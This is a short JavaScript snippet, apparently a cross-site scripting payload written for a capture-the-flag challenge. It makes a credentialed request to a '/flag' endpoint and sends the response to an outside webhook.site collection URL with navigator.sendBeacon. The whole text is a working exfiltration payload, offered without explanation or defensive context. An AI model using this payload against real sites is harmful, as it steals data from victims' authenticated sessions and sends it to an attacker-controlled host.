var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
   navigator.sendBeacon('https://webhook.site/65852bc0-6428-4d56-865d-1be496cd22d2', this.responseText);
  }
};
xhttp.open("GET", "/flag", true);
xhttp.withCredentials = true;
xhttp.send();
